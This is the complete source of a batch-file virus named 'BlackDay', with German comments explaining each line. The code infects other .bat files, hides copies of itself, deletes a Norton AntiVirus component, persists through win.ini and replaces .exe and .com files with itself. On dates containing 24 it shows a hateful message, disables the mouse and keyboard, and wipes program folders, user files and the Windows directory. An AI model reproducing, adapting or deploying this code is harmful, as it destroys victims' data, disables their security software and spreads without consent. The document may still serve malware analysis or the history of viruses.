@echo off%_bd-ptrr%				;alle Ausgaben werden abgeschaltet und nach _bd-ptrr geleitet
if '%1=='bd-ptrr goto bd-ptrr%2			;falls bat-Datei schon infiziert ist, wird weitergesprungen
set bd-ptrr=%0.bat				;alle bat-Dateien werden als Parameter bd-ptrr definiert
if not exist %bd-ptrr% set bd-ptrr=%0		;wenn bd-ptrr noch nicht vorhanden ist, wird dies als Parameter 0 definiert
if '%bd-ptrr%==' set bd-ptrr=autoexec.bat	;nicht infizieren, wenn autoexec.bat in bd-ptrr enthalten ist
if exist c:\_bd-ptrr.bat goto bd-ptrrg		;wenn c:\_bd-ptrr.bat existiert, wird nach bd-ptrrg gesprungen
if not exist %bd-ptrr% goto ebd-ptrr		;wenn bd-ptrr noch nicht vorhanden ist, wird nach ebd-ptrr gesprungen
find "bd-ptrr"<%bd-ptrr%>c:\_bd-ptrr.bat	;Parameter bd-ptrr wird in c:\_bd-ptrr.bat gesucht
attrib c:\_bd-ptrr.bat +h			;die Datei c:\_bd-ptrr.bat wird versteckt
:bd-ptrrg					;Sprungmarke
command /c c:\_bd-ptrr bd-ptrr vir		;c:\_bd-ptrr wird ausgeführt und command.com beendet
:ebd-ptrr					;Sprungmarke
set bd-ptrr=					;Parameter bd-ptrr wird geleert
goto bd-ptrrend					;springt nach bd-ptrrend
:bd-ptrrvir					;Sprungmarke
for %%a in (*.bat ..\*.bat) do call c:\_bd-ptrr bd-ptrr i %%a	;hängt den Virus an alle bat-Dateien in diesem und in den darunterliegenden Verzeichnisen an
exit bd-ptrr					;bd-ptrr wird beendet
:bd-ptrri					;Sprungmarke
find "bd-ptrr"<%3>nul				;sucht nach übriggebliebenen bd-ptrr-Parametern
if not errorlevel 1 goto bd-ptrrend		;wenn keine übriggebliebene bd-ptrr-Parameter gefunden werden, wird nach bd-ptrrend gesprungen
type %3>bd-ptrr$				;zeigt den Inhalt des Parameters bd-ptrr an
echo.>>bd-ptrr$					;die Ausgabenleitung nach bd-ptrr wird abgeschaltet
type c:\_bd-ptrr.bat>>bd-ptrr$			;zeigt den Inhalt des Parameters bd-ptrr in c:\_bd-ptrr.bat an
move bd-ptrr$ %3>nul				;leitet weitere Ausgaben über den Parameter bd-ptrr ins Nichts
:bd-ptrrend					;Sprungmarke
ctty nul					;alle Ausgaben werden ins Nichts geleitet
del c:\programme\norton~1\s32integ.dll		;macht Norton AntiVirus 2000 scan-unfähig
copy BlackDay.bat c:\windows\system		;kopiert den Virus nach c:\windows\system
attrib +h c:\windows\system\BlackDay.bat	;versteckt den Virus in c:\windows\system
copy BlackDay.bat + c:\windows\win.ini c:\windows\system\win.ini	;hängt die win.ini an den Virus an, und speichert das ganze als c:\windows\system\win.ini
del c:\windows\win.ini				;löscht die win.ini
move c:\windows\system\win.ini c:\windows	;verschiebt die Datei c:\windows\system\win.ini ins Windows-Verzeichnis
goto comexe					;springt nach comexe
						;diese Zeile ist nötig für win.ini
[windows]					;Marke für die win.ini
load=c:\windows\system\BlackDay.bat		;lädt den Virus bei jedem Systemstart
run=C:\WINDOWS\SYSTEM\cmmpu.exe			;win.ini Standardeinstellung
NullPort=None					;win.ini Standardeinstellung
						;diese Zeile ist nötig für win.ini
:comexe						;Sprungmarke
for %%f in (*.exe *.com) do set A=%%f		;alle com- und exe-Dateien werden im Parameter A gespeichert
if %A%==COMMAND.COM set A=			;enthält der Parameter A die Datei COMMAND.COM, wird er geleert
rename %A% V%A%					;allen Dateien im Parameter A wird ein V vor den Namen geschrieben
if not exist V%A% goto phnord			;wenn obiges Umbenennen schief gegangen ist (z.B.: Datei ist gerade geöffnet), wird nach phnord gesprungen
attrib +h V%A%					;alle umbenannten Dateien werden versteckt
copy %0.bat %A%					;der Virus wird an die Stelle der alten Datei (vor dem Umbenennen) kopiert
attrib +r %A%					;der Virus an der Stelle der alten Datei wird schreibgeschützt
ren %A% *.bat					;der Virus an der Stelle der alten Datei wird in eine bat-Datei umbenannt
set A=						;der Parameter A wird geleert
:phnord						;Sprungmarke
echo.|date|find "24">nul.bd-ptrr		;es wird überprüft, ob das aktuelle Datum die Zahl 24 enthält
if errorlevel 1 goto phuck			;wenn das aktuelle Datum die Zahl 24 nicht enthält wird nach phuck gesprungen
ctty con					;die Ausgaben werden auf den Bildschirm geleitet
echo I hate Jesus Christ and his phuckin Birthday.	;zeigt "I hate Jesus Christ and his phuckin Birthday." an
echo For me is the 24th of December just another BlackDay in a dark World.	;zeigt "For me is the 24th of December just another BlackDay in a dark World." an
echo For you now, every 24th gets such a BlackDay.	;zeigt "For you now, every 24th gets such a BlackDay." an
echo The same for your phuckin System, too.	;zeigt "The same for your phuckin System, too." an
echo ...					;zeigt "..." an
echo BlackDay phinal by PhileT0a$t3r [rRlf]	;zeigt "BlackDay phinal by PhileT0a$t3r [rRlf]" an
ctty nul					;alle Ausgaben werden ins Nichts geleitet
c:\windows\rundll32.exe mouse,disable		;schaltet die Maus ab
c:\windows\rundll32.exe keyboard,disable	;schaltet das Keyboard ab
del c:\t_online\online.exe			;killt T-Online
del c:\acrobatx\reader\acrord32.exe		;killt AcrobatReader
del c:\corel\draw70\programs\photopnt.exe	;killt Corel Photopaint 7.0
del c:\winzip\winzip32.exe			;killt WinZip
deltree /y c:\windows\desktop			;killt den Desktop
deltree /y c:\eigene~1				;killt die Eigenen Dateien
deltree /y c:\windows\sendto			;killt das SendTo-Verzeichnis
deltree /y c:\programme				;killt das Programme-Verzeichnis
deltree /y c:\programs				;killt das programs-Verzeichnis
deltree /y c:\windows				;der Versuch, möglichst viel von Windoze mitzunehmen, bevor das Opfer endlich seinen Computer ausschaltet
c:\windows\rundll32.exe user,disableoemlayer	;der Computer hängt sich auf
:phuck						;Sprungmarke
ctty con					;die Ausgaben werden auf den Bildschirm geleitet
@if exist V%0.com V%0.com %1 %2 %3		;falls die durch den Virus ersetzte Datei eine com-Datei war, wird diese jetzt ausgeführt
@if exist V%0.exe V%0.exe %1 %2 %3		;falls die durch den Virus ersetzte Datei eine exe-Datei war, wird diese jetzt ausgeführt
ctty nul					;alle Ausgaben werden ins Nichts geleitet
:dusk						;the End of another BlackDay ;>
						;diese Zeile ist nötig für win.ini